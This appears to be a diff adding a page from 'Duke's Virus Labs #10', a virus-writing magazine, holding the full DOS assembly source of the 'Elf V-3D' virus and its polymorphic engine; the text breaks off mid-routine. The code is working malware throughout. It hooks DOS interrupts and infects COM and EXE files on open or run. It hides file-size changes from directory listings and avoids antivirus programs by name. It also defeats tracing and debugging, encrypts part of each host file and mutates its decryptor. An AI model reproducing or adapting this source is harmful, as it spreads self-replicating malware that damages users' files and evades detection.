@@ -1,0 +1,1589 @@
+- [Duke's Virus Labs #10] - [Page 14] -
+
+Elf V-3D
+(c) by LordDark
+
+
+===== begin elf.asm =====
+mz  struc 
+        mzSignature  dw ?     ; MZ или ZM
+        mzExtraBytes dw ?     ; остаток от деления на 512 
+        mzPages      dw ?     ; кол-во страниц
+        mzRelocItems dw ?     ; кол-во настраеваемых элементов
+        mzHeaderSize dw ?     ; размер заголовка
+        mzMinAlloc   dw ?     ; мин. число памяти
+        mzMaxAlloc   dw ?     ; макс. -||-
+        mzInitSS     dw ?     ; SS
+        mzInitSP     dw ?     ; SP
+        mzCheckSum   dw ?     ; контрольная сумма всегда = 0
+        mzInitIP     dw ?     ; IP
+        mzInitCS     dw ?     ; CS
+        mzRelocTable dw ?     ; смещ. настраеваемых элем.
+        mzOverlay    dw ?      
+ends
+
+dta  struc
+        dtaFill db 21 dup (?)
+        dtaAttr db ?
+        dtaTime dd ?
+        dtaSize dd ?          ; размерчик
+        dtaName db 13 dup (?) ; имя файлы     
+ends
+
+max_fsize = 50000
+big_poly  = 273h+100
+dec_size  = ((vl+202+big_poly)/16)+1
+IntConst  = 3h
+
+locals __
+.model tiny
+.code
+org 0h
+start:
+virus_start:
+save_all:
+      .286
+      call $+3
+delta:
+      pop  bp
+      sti
+      cld
+      sub  bp, offset delta 
+install:
+      mov  ax, 0CAFEh
+      clc
+      int  21h              ; проверка на нас
+      jc   exit
+      mov  ax, 3305h
+      int  21h              ; Если грузились с дискеты ..
+      cmp  dl, 3
+      jb   exit
+      call trace_int21      ; получаем ориг. обработчик
+      jz   exit
+      mov  ah, 62h
+      int  21h              ; BX = PSP
+      mov  es, bx
+      sub  bx, bx
+      mov  ah, 4Ah
+      dec  bx
+      int  21h
+      sub  bx, _vl/16+2
+      mov  ah, 4Ah
+      int  21h
+      mov  bx, _vl/16+1
+      mov  ah, 48h
+      int  21h             ; выделяем памяти
+      jc   exit   
+      mov  es, ax
+      dec  ax
+      mov  ds, ax
+      sub  di, di
+      mov  2 ptr ds:[di+1], 8             
+      mov  1 ptr ds:[di],  'Z'
+      mov  cx, vl
+      mov  si, bp
+      rep  movs 1 ptr es:[di],cs:[si]
+      Push Es
+      Pop  Ds
+      mov  ax, 3521h
+      int  21h
+      mov  2 ptr ds:[no_run+3],   bx
+      mov  2 ptr ds:[no_run+5],   es
+      lea  dx, int_21
+      Mov  Ax, 2521h
+      int  21h     
+
+include exit.inc
+
+int_21 proc
+      cmp ax, 0CAFEh
+      jnz no_dead
+      stc
+      retf 2
+no_dead:  
+      xchg al, ah
+      cmp al, 4Eh            
+      jnz no_find_first
+find_file:
+      xchg al, ah
+      jmp find               ; FindFirst&FindNext stealth
+no_find_first:
+      cmp al, 4Fh
+      jz  find_file 
+      cmp al, 3Dh
+      jz  _hehe
+      cmp ax, 004Bh
+      jnz no_run
+_hehe:
+      Call Init              ; сохраняем регистры
+      Push Dx
+      Call Cmp_Name          ; злостный зверь?
+      Jc   Err_Name
+      Call test_Rash         ; COM или EXE ?
+      Jc   Err_Name
+      mov  ah, 62h
+      int  IntConst         
+      mov  es, bx            ; BX = PSP
+      mov  ah, 48h
+      mov  bx, dec_size
+      int  IntConst    
+      jc   Err_Name          ; выделяем памяти для буфера
+      mov  cs:buf_seg, ax   
+      Pop  Dx
+      Call infect            ; инфицируем
+      mov  es, cs:buf_seg  
+      mov  ah, 49h
+      int  IntConst
+      jmp  $+3
+Err_Name:
+      Pop Dx   
+      Call Done              ; востанавливаем регистры
+no_run:
+      xchg al, ah
+sifilis:
+      db 0eah
+      dd 0
+int_21 endp
+
+infect proc
+      mov byte ptr cs:[use_it], 60h  ; pusha
+                                     ; сохраняем регистры    
+      mov ax, 4300h
+      int IntConst
+      jnc __1
+__4:
+      ret 
+__1:  push cx ds dx
+      mov ax, 4301h
+      sub cx, cx
+      int IntConst
+      jc __4
+__3:
+      mov ax, 3d42h
+      int IntConst
+      xchg ax, bx
+      Push Cs Cs
+      Pop  Ds Es
+      mov ax, 5700h
+      int IntConst
+      push cx dx
+      mov di, dx
+      mov ah, 2Ch 
+      int IntConst
+      mov A, cx
+      mov b, dx               ; для Random
+      mov ah, 2Ah
+      int IntConst
+      xor dx, di
+      and dx, 18h
+      jz  $close             
+      lea dx, exe_header
+      mov si, dx
+      mov cx, 1Ch
+      call read
+      jc _close
+      mov  al, [si+2]
+      mov  1 ptr [LostBytes_2], al 
+      lodsw
+      mov  2 ptr [LostBytes_1], ax
+      not ax
+      mul ah
+      cmp ax, 72BAh       ; MZ или ZM ?
+      jz  exe_filez  
+      call seek_end
+      cmp  dx, 4          ; смотрим на размерчик
+      ja   $$close
+      call test_infect    ; если делится без остатка на 101
+                          ; => инфицирован   
+$close:
+      jz  $$close
+      mov fsize1, ax
+      mov fsize2, dx 
+      dec dx
+      jns close
+      cmp ax, max_fsize
+      ja  close
+      cmp ax, 4000
+      jb  close
+      ; 512..fsize-512
+      sub ax, 512
+_$7:  mov dx, ax
+      call random
+      xchg ax, dx
+      cmp dx, 512
+      jb  _$7
+      mov 2 ptr ds:[OfsCom], dx
+_$8:
+      mov ax, 100h
+      call random
+      or  ax, ax
+      jz  _$8
+      mov 1 ptr ds:[KeyCom], al
+      call test_simbioz          ; ищем поледовательность байт
+                                 ; характерных для многих пакеров
+_close:
+      jc __2
+      call simbioz
+$$close:
+      jmp close
+__2:  call _enuns                ; Windows COM файлы 
+      jmp close
+exe_filez:
+      call seek_end
+      mov fsize1, ax
+      mov fsize2, dx 
+      cmp dx, 1234h
+      org $-2      
+      dw  (300*1024 shr 16)     ; == 4 ;)
+      ja  close
+      test dx, dx
+      jnz __5
+      cmp ax, 5000
+      jb close
+__5:
+      push ax dx  
+      sub ax, 512
+__7:  mov dx, ax
+      call random
+      xchg ax, dx
+      cmp dx, 512
+      jb  __7
+      mov 2 ptr ds:[OfsCom], dx
+__8:
+      mov ax, 100h
+      call random
+      or  ax, ax
+      jz  __8
+      mov 1 ptr ds:[KeyCom], al
+      pop dx ax
+      call test_infect
+      jz  close
+      call try_infect_exe
+close:
+      pop dx cx
+      mov ax, 5701h
+      int IntConst
+      mov ah, 3Eh
+      int IntConst
+end_attr:
+      pop dx ds cx
+      mov ax, 4301h
+      int IntConst
+      ret
+infect endp
+
+test_infect:
+      ; ax:dx - file size
+      push ax dx
+      mov cx, 101
+      div cx
+      test dx, dx
+      pop dx ax
+      ret 
+
+test_simbioz proc 
+      ; mov reg16, XXXX
+      ; mov cx,    XXXX
+      ; cld / std
+      ; rep movsw / movsb
+      lea si, exe_header
+      mov cx, 1Ch
+      mov al, [si]   
+      cmp al, 0E9h
+      jz  err_check
+      cmp al, 0EBh
+      jz  err_check
+      sub ah, ah
+no_0B8:
+      lodsb
+      cmp al, 0B9h
+      jnz no_B9
+      or  ah, 10b
+      inc  si
+      inc  si 
+      cmp  cl, 2 
+      jb   err_check
+      dec  cx
+      dec  cx   
+      jmp  no_B8
+no_B9:
+      and al, not 1
+      cmp al, 0FCh
+      jnz no_FC
+      mov dx, [si]
+      and dh, not 1
+      cmp dx, 0A4F3h
+      jz  ok_find
+no_FC: 
+      and al, not 110b
+      cmp al, 0B8h
+      jnz no_B8
+      inc si
+      inc si 
+      or  ah, 1  
+      cmp cl, 2
+      jb  err_check
+      dec cx
+      dec cx
+no_B8:
+      loop no_0B8
+      jcxz err_check
+ok_find:
+      cmp ah, 11b
+      jnz err_check
+      ret
+err_check:
+      stc 
+      ret  
+      endp
+
+simbioz proc 
+      mov  ax, 2 ptr [si-1]
+      mov  2 ptr [LostBytes_1], ax
+      mov  al, 1 ptr [si+1]
+      mov  1 ptr [LostBytes_2], al
+      mov  1 ptr [si-1], 0E8h
+      push si
+      mov  ax, fsize1
+      add  ax, 100h   
+      call gen_body
+      call virus_write 
+      pop  di
+      jc   __1
+      mov  dx, offset exe_header
+      sub  dx, di
+      neg  dx
+      inc  dx
+      inc  dx 
+      mov  ax, fsize1
+      sub  ax, dx
+      mov  2 ptr [di], ax 
+      call write_header
+      jc    __1
+      call crypt_com
+__1:
+      ret
+      endp      
+
+_enuns proc
+      ; в конце строка "ENUNS"
+      ; не шифруем, т.к. опасно для жизни ;]
+      mov ax, 4202h
+      mov cx, -1 
+      mov dx, -7
+      int IntConst
+      lea dx, enun
+      mov di, dx
+      mov cx, 7
+      call read
+      jc __1
+      lea si, Enuns
+      mov cx, 5 
+      repe cmpsb
+      jnz __1
+      mov  ax, fsize1
+      add  ax, 100h-7
+      sub  fsize1, 7   
+      call gen_body 
+      mov  dx, 7
+      add  fsize1, dx 
+      mov  ax, cx
+      sub  ax, dx
+      add 2 ptr [enun+5], ax
+      push cx
+      mov ax, 4202h
+      mov cx, -1 
+      mov dx, -7
+      int IntConst
+      pop cx
+      push es ds
+      push cx 
+      mov  es, 2 ptr cs:[buf_seg]
+      mov  di, cx
+      lea  si, enun
+      mov  cx, 7
+      sub  di, cx
+      rep  movs 1 ptr es:[di], cs:[si]
+      pop  cx    
+      call virus_write
+      pop  ds es
+      jc   __1
+      call seek_beg
+      mov ax, fsize1
+      sub ax, 3+7
+      mov 2 ptr [exe_header+1], ax 
+      mov 1 ptr [exe_header], 0E8h
+      call write_header
+__1:
+      ret
+      endp
+
+virus_write:
+      ; вирь на диск и пару байт
+      ; в конец ;)))
+      push ds
+      mov  ds, 2 ptr cs:[buf_seg]
+      mov  di, cx
+      mov  ax, cs:fsize1
+      mov  2 ptr ds:[di-11], ax
+      mov  ax, cs:fsize2
+      mov  2 ptr ds:[di-11+2], ax
+      sub  dx, dx
+      call write      
+      pop  ds 
+      ret
+
+try_infect_exe proc
+      ; Overlays батенька ? 
+      mov cx, 200h
+      div cx
+      test dx, dx
+      jz  __2
+      inc ax
+__2:
+      lea si, exe_header
+      cmp 2 ptr [si.mzPages], ax
+      jz  __6
+__1:
+      ret
+__6:
+      cmp 2 ptr [si.mzExtraBytes], dx
+      jnz __1
+      sub ax, ax
+      cmp 2 ptr [si.mzCheckSum], ax
+      jnz __1
+      cmp 2 ptr [si.mzRelocItems], ax
+      jz  __1
+      mov ax, [si.mzHeaderSize]
+      mov HdrSize, ax
+      cmp ax, 0FFFFh shr 4
+      ja  __1
+      mov cl, 4
+      shl ax, cl
+      cmp 2 ptr [si.mzRelocTable], ax
+      jae  __1       
+      mov ax, [si.mzInitIP]
+      mov OldIP, ax
+      mov ax, [si.mzInitCS]
+      mov OldCS, ax
+      mov dx, [si.mzInitSS]
+      cmp ax, dx
+      jz  __1  
+      mov OldSS, dx
+      mov ax, [si.mzInitSP]
+      mov OldSP, ax      
+      mov ax, [si.mzRelocItems]
+      mov 2 ptr [RelocNum], ax
+      mov ax, [si.mzRelocTable]
+      mov 2 ptr [RelocOfs], ax
+      mov ax, fsize1
+      mov dx, fsize2
+      mov cx, 10h
+      div cx
+      sub ax, 2 ptr [si.mzHeaderSize]
+      mov 2 ptr [si.mzInitCS], ax
+      mov 2 ptr [si.mzInitIP], dx
+      push ax
+      mov ax, 2048 shr 4
+      call random
+      pop dx
+      inc dx
+      add ax, dx
+      mov 2 ptr [si.mzInitSS], ax
+      mov ax, 0FFFEh-0DE00h
+      call random
+      add ax, 0DE00h
+      mov 2 ptr [si.mzInitSP], ax  
+      ; проверка можно ли
+      ; превращать в COM файл ?
+      ; или стандартное EXE инфицирование
+      mov ax, fsize1
+      mov dx, fsize2
+      dec dx
+      jns __4  
+      cmp ax, max_fsize
+      ja  __4 
+      push si
+      mov cx, 1Ch
+__3:
+      ; затираем EXE header
+      mov byte ptr ds:[si], ch
+      inc si
+      loop __3
+      mov byte ptr cs:[use_it], 90h
+      pop di
+      push di
+      call gen_header
+      pop dx
+      mov al, 0E9h
+      stosb
+      mov ax, fsize1
+      ; fsize1-(di-dx)-3 
+      sub ax, di
+      add ax, dx
+      sub ax, 2
+      stosw
+      mov  ax, fsize1
+      add  ax, 100h
+      call gen_body
+      call virus_write
+      jc  __7
+      call write_header      
+      jc  __7
+      jmp crypt_com
+__4:
+      push si 
+      mov  ax, [si.mzInitIP]
+      call gen_body
+      call virus_write 
+      pop si
+      jc __7
+      mov ax, 4201h
+      sub cx, cx
+      cwd
+      int IntConst   ; AX:DX fsize
+      mov cx, 200h
+      div cx
+      test dx, dx
+      jz __5
+      inc ax
+__5:  mov 2 ptr [si.mzPages], ax
+      mov 2 ptr [si.mzExtraBytes], dx
+      call write_header
+__7:
+      ret  
+      endp
+
+gen_body:
+      ; в буфер пихаем полиморфик
+      push es
+      mov  es, 2 ptr cs:[buf_seg]
+      sub  di, di
+      sub  si, si
+      mov  cx, (vl/2)+1
+      push bx
+      call engine
+      pop  bx
+      mov di, cx
+      mov ax, fsize1
+      mov dx, fsize2
+      add ax, cx
+      adc dx, 0
+      mov cx, 101
+      div cx
+      sub dx, dx
+      inc ax
+      inc ax     
+      mul cx       
+      sub ax, fsize1
+      push ax
+      sub ax, di
+      xchg ax, cx
+__1:      
+      mov ax, 100h
+      call random
+      stosb
+      loop __1
+      pop  cx 
+      pop  es
+      ret
+
+test_rash:
+      mov di, dx
+      mov ax, [di-5]
+      and ax, not 2020h
+      mov dx, [di-5+2]
+      and dx, not 2020h 
+      cmp ax, ('C' shl 8)+0Eh
+      jnz not_com
+      cmp dx, 'MO'
+      jnz bad_bad 
+_ex_check:
+      ret
+not_com:
+      cmp ax, ('E' shl 8)+0Eh
+      jnz bad_bad
+      cmp dx, 'EX'
+      jz  _ex_check
+bad_bad:
+      stc
+      jmp _ex_check
+
+write_header:
+      call seek_beg
+      lea  dx, exe_header
+      mov  cx, 1Ch
+      jmp  write  
+
+read:
+      mov ah, 3Fh
+      int IntConst
+t_write:
+      jc  __1
+      cmp ax, cx
+      jz __1
+      stc
+__1:
+      ret
+write:
+      mov ah, 40h
+      int IntConst
+      jmp t_write
+seek_beg:
+      mov ax, 4200h
+      sub cx, cx
+      cwd
+      int IntConst
+      ret
+seek_end:
+      mov ax, 4202h
+      sub cx, cx
+      cwd 
+      int IntConst
+      ret 
+
+random:
+    ; генерация случайных чисел
+    push bx cx dx
+    push ax
+    mov ax, 0
+    org $-2
+A   dw  0
+    mov bx, 0
+    org $-2
+B   dw  0
+    mov cx, ax
+    mov dx, 8405h
+    mul dx
+    shl cx, 3
+    add ch, cl
+    add dx, cx
+    add dx, bx
+    shl bx, 2
+    add dx, bx
+    add dh, bl
+    mov cl, 5  
+    shl bx, cl
+    add dh, bl
+    add ax, 1
+    adc dx, 0
+    mov 2 ptr [A], ax
+    mov 2 ptr [B], dx
+    pop bx
+    mov cx, dx
+    mul bx
+    mov ax, cx
+    mov cx, dx
+    mul bx
+    add ax, cx
+    adc dx, 0
+    xchg ax, dx
+    pop dx cx bx
+    ret
+
+    db '[ELF V-3D]'
+    ;  Названиe - ELF  
+    ;  Операц.  - DOS
+
+cmp_name:
+      cld
+      push ds
+      pop  es   
+      mov  di, dx
+      sub  al, al
+      mov  cx, 41h
+      cld
+      repne scasb
+      push di
+      jcxz __4
+      xchg ax, cx ; cx = ax
+      mov cx, 41h
+      sub cx, ax
+      mov dx, di
+__6:
+      cmp byte ptr [di-1], '\'
+      jz  __5
+      cmp byte ptr [di-1], ':'
+      jz  __5
+      dec di 
+      loop __6
+__5:
+      mov dx, di
+      lea si, bad_namez
+__2:
+      lods byte ptr cs:[si]
+      or al, al
+      jz  __1
+      mov cl, al
+      sub ch, ch
+      push si cx
+      mov  di, dx
+__7:
+      mov  ah, [di]
+      and  ah, not 20h
+      lods byte ptr cs:[si]
+      inc  di
+      cmp  ah, al
+      jnz  __3
+      loop __7
+      pop cx si
+__4:
+      stc
+__1:  pop dx
+      ret 
+__3:
+      pop cx si
+      add si, cx
+      jmp __2  
+
+bad_namez:
+      db 3,'AID'
+      db 5,'DRWEB'
+      db 5,'ADINF'
+      db 3,'AVP'
+      db 3,'NDD'
+      db 3,'SCA'
+      db 4,'GOAT'
+      db 0
+
+Enuns db 'ENUNS'
+
+Int24:
+      Mov Al, 3
+      Iret
+
+Init  Proc
+      Pop 2 ptr cs:[_Ret] 
+      PushA 
+      Push Ds Es
+      Mov Si, Dx
+      Mov Di, Ds 
+      Mov Ax, 3524h
+      PushF 
+      Push CS
+      Call Int_3h
+      Push Es Bx       
+      Mov Ax, 3503h
+      PushF 
+      Push CS
+      Call Int_3h
+      Push Es Bx
+      Push Cs
+      Pop  Ds
+      Lea  Dx, Int_3h
+      Mov  Ax, 2503h
+      PushF 
+      Push CS
+      Call Int_3h
+      Mov  Ax, 2524h
+      Lea  Dx, Int24
+      Int  3h
+      Mov  Ds, Di
+      Mov  Dx, Si  
+      jmp  2 ptr cs:[_Ret]
+      Endp
+
+Done  Proc
+      Pop  2 ptr cs:[_Ret]
+      Pop  Dx Ds
+      Mov  Ax, 2503h
+      Int  3H
+      Pop  Dx Ds
+      Mov  Ax, 2524h
+      PushF 
+      Push CS
+      Call Int_3h
+      Pop  Es Ds
+      PopA
+      jmp  2 ptr cs:[_Ret]
+      Endp
+
+; вирь шифрует 512 байт в файле
+
+crypt_com:
+      push ds
+      mov  ds, 2 ptr cs:[buf_seg]
+      mov  ax, 4200h
+      sub  cx, cx
+      mov  dx, 0
+      org  $-2
+OfsCom     dw 0FB00h
+      int  IntConst
+      mov  cx, 512
+      sub  dx, dx
+      call read
+      jc   __1
+      sub  si, si
+      mov  al, 0  
+      org  $-1
+KeyCom     db 0  
+__2:
+      xor  1 ptr ds:[si], cl
+      sub  1 ptr ds:[si], al
+      sub  al, cl
+      inc  si
+      loop __2      
+      mov  ax, 4200h
+      mov  dx, cs:OfsCom
+      int  IntConst
+      mov  cx, 512
+      sub  dx, dx
+      call write
+__1:   
+      pop  ds
+      ret
+
+int_3h:
+      db 0eah
+dos_ofs_21 dw 0
+dos_seg_21 dw 0 
+
+trace:
+       ; трассировка 0x21  
+       push bp
+       mov  bp, sp
+       push ax
+       push si
+       call $+3
+delta1:
+       pop  si
+       sub  si, offset delta1
+       db   0B8h
+dos_seg     dw 0
+       db   36h
+       cmp  ax, [bp+2+2]
+       jnz  not_me
+       mov  2 ptr cs:[dos_seg_21+si], ax
+       db   36h 
+       mov  ax, [bp+2] 
+       mov  2 ptr cs:[dos_ofs_21+si], ax
+       pop  si  
+       pop  ax
+       pop  bp
+       inc  si
+       retf 2
+not_me:
+       pop  si    
+       pop  ax
+       pop  bp
+       iret 
+
+trace_int21:
+       mov ax, 3501h
+       int 21h
+       push es bx cs
+       pop ds       
+       lea dx, [bp+trace]
+       mov ax, 2501h
+       int 21h
+       mov ax, 1203h
+       int 2Fh
+       mov 2 ptr cs:[bp+dos_seg], ds
+       pushf
+       pushf
+       pop ax
+       or  ax, 100h
+       push ax
+       popf
+       sub si, si
+       mov es, si
+       mov ah, 30h
+       call 4 ptr es:[21h*4]
+       pop dx ds
+       mov ax, 2501h
+       int 21h
+       test si, si
+       ret
+
+find   proc
+       ; stealth 
+       pushf
+       push  cs
+       call  sifilis
+       jc    __Err
+       pushf
+       call  init
+       mov   ah, 2Fh
+       int   IntConst
+       push  es
+       pop   ds
+       mov   ax, 2 ptr [bx.dtaSize]
+       mov   dx, 2 ptr [bx.dtaSize+2] 
+       cmp   dx, 5
+       ja    _done
+       call  test_infect
+       jnz   _done
+       mov   di, bx
+       lea   dx, [bx.dtaName]
+       mov   ax, 3DC0h
+       int   IntConst
+       jc    _done
+       xchg  ax, bx
+       mov   ax, 4202h
+       mov   cx, -1
+       mov   dx, -11
+       int   IntConst
+       mov   cx, 4
+       lea   dx, fsize1
+       push  cs
+       pop   ds
+       call  read  
+       jc    __close
+       mov   ax, fsize2
+       cmp   ax, 2 ptr es:[di.dtaSize+2] 
+       ja    __close
+       mov   2 ptr es:[di.dtaSize+2], ax
+       mov   ax, fsize1
+       mov   2 ptr es:[di.dtaSize],   ax 
+__close:
+       mov   ah, 3Eh
+       int   IntConst
+_done:
+       call  done
+       popf
+__Err:
+       Retf  2 
+find   endp
+
+garbage:
+       db 10001011b
+       db 00000011b
+       db 00010011b
+       db 00100011b
+       db 00001011b
+       db 00101011b
+       db 00011011b
+       db 00110011b
+       db 10000101b
+       db 00111011b
+len_garbage = ($-garbage)
+
+gen_header proc
+       ; заголовок для exe2com
+       mov ax, 6
+       call random
+       xchg ax, cx
+       jcxz __1
+__2:
+       call gen_byte 
+       loop __2     
+__1:   mov al, 60h
+       stosb
+       mov ax, 8
+       call random
+       inc ax
+       xchg ax, cx
+__3:   lea si, garbage
+       mov ax, len_garbage
+       call random
+       add si, ax
+       lodsb
+       stosb
+__4:
+       mov ax, 100h
+       call random
+       mov ah, al
+       and ah, 00111000b
+       cmp ah, 00100000b
+       jz  __4
+       or  al, 11000000b
+       stosb 
+       loop __3
+       ret
+gen_header endp
+
+one_byte:
+    clc
+    cld
+    cli
+    cmc
+    sti
+    nop
+    stc
+    std
+    sahf
+ob_len = ($-one_byte)
+
+include engine.inc
+
+vl = ($-start)
+
+buffer:
+ 
+exe_header db 1Ch dup (?)
+fsize1     dw ?
+fsize2     dw ?
+Enun       db 7 dup (?)
+_ret       dw ?
+buf_seg    dw ?
+
+_vl = ($-start)
+end start
+===== end   elf.asm =====
+
+===== begin engine.inc =====
+engine:
+    _ax = 0
+    _cx = 1
+    _dx = 2
+    _bx = 3
+    _sp = 4
+    _bp = 5
+    _si = 6
+    _di = 7
+    mov $di, di
+    mov $cx, cx
+    mov $si, si
+    mov $ax, ax 
+    mov 1 ptr cs:reg1, -1
+    mov al, 0
+use_it  equ byte ptr $-1
+    cmp al, 90h
+    jz  $__
+       mov ax, 6
+       call random
+       xchg ax, cx
+       jcxz $__1
+$__2:
+       call gen_byte 
+       loop $__2     
+$__1:   mov al, 60h
+       stosb
+$__:     
+    ;----------[ Start]--- 
+    call gen_garbage
+    mov  ax, 0
+    org  $-2
+    mov  al, 0ADh
+    stosw
+    mov  1 ptr cs:reg1, _ax
+    call gen_garbage
+    mov  ax, 0
+    org  $-2
+    out  64h, al
+    stosw
+    mov  1 ptr cs:reg1, -1
+    call gen_garbage
+    call not_trace
+    call gen_garbage 
+    mov ax, 4
+    call random
+    ; 3 5 6 7
+    cmp al, 0
+    jnz __1
+    mov al, 3
+    jmp __2
+__1:
+    add al, 5-1
+__2:
+    mov cs:reg1, al
+    ; mov reg, offset body
+    call load
+    push di
+    call gen_garbage
+    mov al, 2Eh
+    stosb
+    mov ax, 3
+    call random
+    shl al, 1
+    mov bx, ax
+    mov ax, 2 ptr cs:[bx+decrypt_inst]
+    mov cs:_crypt, ax
+    add bx, offset crypt_inst
+    mov al, 1 ptr cs:[bx]
+    stosb
+    mov al, 0
+reg1 equ byte ptr $-1
+    ; _bx _si _di _bp
+    ;  3   0   1   2
+    ;  3   6   7   5
+    cmp al, _bx
+    jz  __4
+__3:
+    cmp al, _si
+    jnz __5
+    mov al, 0
+    jmp __4
+__5:
+    cmp al, _di
+    jnz __6
+    mov al, 1
+    jmp __4
+__6:
+    mov al, 2     
+__4:
+    or  al, cs:[bx+1]
+    stosb
+; ->
+    mov  cs:ofs_body, di ; ofs
+    stosw 
+$$1:
+    mov  ax, -1
+    call random
+    test ax, ax
+    jz   $$1  
+    stosw
+    mov  cs:key, ax ; key
+    call gen_garbage
+    ;-------[ Inc ]--- 
+    mov al, 40h
+    or  al, cs:reg1
+    stosb
+    push ax
+    call gen_garbage 
+    pop  ax
+    stosb
+    call gen_garbage    
+    ;--------[ Cmp ]---
+    mov al, 10000001b
+    stosb
+    mov al, 11111000b
+    or  al, cs:reg1
+    stosb
+; ->
+    mov cs:max_ofs, di
+    stosw
+    ;--------[ Jne ]--- 
+    mov al, 75h
+    stosb
+    pop ax
+    push ax
+    sub ax, di
+    dec ax
+    cmp ax, not 80h
+    ja  _$1
+    mov 1 ptr es:[di-1], 74h
+    mov 1 ptr es:[di],   03h
+    mov 1 ptr es:[di+1], 0E9h
+    inc di 
+    inc di 
+    sub ax, 3     
+    stosw    
+    jmp  _$2
+_$1: 
+    stosb
+_$2:
+    ;------------------ 
+    call gen_garbage
+    mov  ax, 0
+    org  $-2
+    mov  al, 0AEh
+    stosw
+    mov  1 ptr cs:reg1, _ax
+    call gen_garbage
+    mov  ax, 0
+    org  $-2
+    out  64h, al
+    stosw
+    mov  1 ptr cs:reg1, -1
+    call gen_garbage  
+    ;----------------
+    mov bx, di
+    sub bx, offset buffer
+$di equ 2 ptr $-2
+    pop si
+$$2:
+    mov ax, -1
+    call random
+    cmp  ax, 8000h
+    jb   $$3
+    test ax, 1
+    ; and ax, 1
+    jnz  $$2    
+$$3:   
+    xchg ax, dx
+    mov ax, bx
+    add ax, 100h
+$ax equ 2 ptr $-2
+    add ax, dx
+    mov 2 ptr es:[si-2], ax
+    neg dx
+    mov bx, 0
+ofs_body equ 2 ptr $-2
+    mov 2 ptr es:[bx], dx
+    mov cx, 1234h
+$cx equ 2 ptr $-2
+    shl cx, 1
+    add ax, cx  
+    mov bx, 0
+max_ofs equ 2 ptr $-2
+    mov 2 ptr es:[bx], ax 
+    mov si, 0
+$si equ 2 ptr $-2
+    mov cx, $cx
+    mov bx, 0
+key equ 2 ptr $-2
+__x:
+    lodsw
+_crypt dw 0 
+    stosw
+    loop __x
+    mov cx, di
+    sub cx, cs:$di 
+    ret
+
+load proc
+    push ax
+    mov ax, 2
+    call random
+    test ax, ax
+    pop ax
+    jz  fuck_it
+    shl al, 3
+    or  al, 06h
+    xchg al, ah
+    mov al, 8Dh
+    stosw  
+    jmp __fuck_it
+fuck_it: 
+    or al, 0B8h
+    stosb
+__fuck_it:
+    xchg ax, dx
+    stosw
+    ret
+    endp
+
+not_trace proc
+     mov ax, 2
+     call random
+     test ax, ax
+     jz  __1
+     call anti_1
+     call gen_garbage
+     call anti_2
+     jmp __2
+__1:
+     call anti_2
+     call gen_garbage
+     call anti_1
+__2:
+     mov dx, 3521h
+     mov al, 0
+     call load
+     mov  ax, 21CDh
+     stosw
+     mov  cs:reg1, _bx
+     call gen_garbage
+     mov  ax, 0
+     org  $-2
+     mov  al, 0CFh
+     stosw
+     mov  cs:regX, _ax
+     call gen_garbage
+     mov  ax, 8626h
+     stosw
+     mov  al, 7
+     stosb
+     call gen_garbage
+     mov  ax, 4CB4h
+     stosw
+     mov  ax, 21CDh
+     stosw
+     call gen_garbage
+     mov  ax, 2
+     call random
+     test ax, ax
+     mov  ah, 86h
+     jnz  __m
+     mov  ah, 88h
+__m:
+     mov  al, 26h
+     stosw   
+     mov  al, 7
+     stosb
+; B0 CF			    mov	al, 0CFh
+; 26: 86 07		    xchg al, 1 ptr es:[bx]
+; B4 4C			    mov	 ah, 4Ch
+; CD 21			    int	 21h
+; 26: 88 07		    mov	 1 ptr es:[bx],	al
+     mov  cs:reg1, -1 
+     mov  cs:regX, -1
+     call gen_garbage
+     ret
+anti_1:
+     mov dx, 3501h
+_anti_x:
+     mov al, 0
+     call load
+     mov  ax, 21CDh
+     stosw
+     mov  cs:reg1, _bx
+     call gen_garbage
+     mov  ax, 0C626h
+     stosw
+     mov  ax, 0CF07h
+     stosw 
+     mov  cs:reg1, -1
+     call gen_garbage
+     ret
+anti_2:
+     mov dx, 3503h
+     jmp _anti_x
+     endp
+
+crypt_inst:
+     db 10000001b,10110100b
+     db 10000001b,10000100b
+     db 10000001b,10101100b
+decrypt_inst:
+     xor ax, bx
+     sub ax, bx
+     add ax, bx
+
+gen_garbage:
+     push dx
+     mov ax, 10
+     call random
+     inc ax
+     xchg ax, cx
+__1:
+     push cx
+     call garage
+     pop  cx
+     loop __1
+     pop dx
+     ret
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+big_garbage:
+; ADD/SUB/XOR/ROL/TEST/CMP...
+IZM_1 = 1
+IZM_0 = 0
+IZM_2 = 2
+    db 10001011b, IZM_1 ; mov
+    db 00000011b, IZM_1 ; add
+    db 00010011b, IZM_1 ; adc
+    db 00100011b, IZM_1 ; and
+    db 00001011b, IZM_1 ; or
+    db 00101011b, IZM_1 ; sub
+    db 00011011b, IZM_1 ; sbb
+    db 00110011b, IZM_1 ; xor
+    db 00111011b, IZM_0 ; cmp
+    db 10000101b, IZM_0 ; test    
+    db 11010001b, IZM_2 ; rxx от 0..7 кроме 6
+len_big_garbage = ($-big_garbage)/2
+
+free_reg:
+     mov ax, 8
+     call random
+     cmp al, cs:reg1
+     jz  free_reg
+     cmp al, 4
+     jz  free_reg
+     cmp al, 0ffh
+regX equ byte ptr $-1
+     jz  free_reg 
+     ret
+
+gen_mov:
+     mov ax, 0fffeh
+     call random
+     xchg ax, dx
+     call free_reg
+     jmp  load 
+
+gen_byte:
+       push bx
+       mov ax, ob_len
+       call random
+       lea bx, one_byte
+       xlat byte ptr cs:[bx]
+       stosb
+       pop bx
+       ret
+
+garage:
+     mov ax, len_big_garbage+2
+     call random
+     cmp al, len_big_garbage
+     jz  gen_byte
+     cmp al, len_big_garbage+1
+     jz  gen_mov
+     shl ax, 1
+     add ax, offset big_garbage
+     mov bx, ax
+     mov al, cs:[bx]
+     stosb
+     mov al, cs:[bx+1]
+     cmp al, 2
+     jnz _standart
+__k:
+     mov ax, 8
+     call random
+     cmp al, 6
+     jz  __k
+     shl al, 3
+     or  al, 0C0h
+     mov bl, al
+     call free_reg
+     or  al, bl
+     stosb
+     ret
+_standart:    
+     push ax
+     mov  ax, 4
+     call random
+     sub  dl, dl
+     cmp  al, 3
+     jz   $$0
+     dec  di
+     mov  ah, es:[di]
+     lea  bx, prefix
+     xlat 1 ptr cs:[bx]
+     stosb
+     mov  al, ah
+     stosb   
+     inc dl
+$$0:   
+     pop  ax   
+     cmp al, 0
+     jnz not_change 
+     mov ax, 8
+     call random
+     jmp mumu
+not_change:
